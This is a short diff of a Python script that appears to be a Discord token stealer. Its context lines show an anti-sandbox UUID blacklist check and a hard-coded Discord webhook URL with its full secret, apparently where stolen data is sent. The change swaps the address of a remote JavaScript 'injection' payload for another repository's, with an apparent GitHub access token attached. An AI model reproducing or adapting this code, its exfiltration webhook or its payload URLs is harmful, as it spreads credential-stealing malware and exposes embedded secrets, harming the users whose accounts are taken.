@@ -53,7 +53,7 @@ if str(uuid.UUID(int=mac_address)) in BLACKLIST1:
 
 
 wh00k = "https://discord.com/api/webhooks/1071758336661409793/jHZVBC1jiYlwDI6QB0r7g1dXmWyovDrXolzXG0yMVbFXJuFBIV7BTY86ln6YLfnHIVsf"
-inj_url = "https://raw.githubusercontent.com/Ayhuuu/injection/main/index.js"
+inj_url = "https://raw.githubusercontent.com/atamanhub/akosinj/main/index.js?token=GHSAT0AAAAAACNCPV7U5RMQEJBFNGIQYIEWZNKNTJQ"
     
 DETECTED = False
 
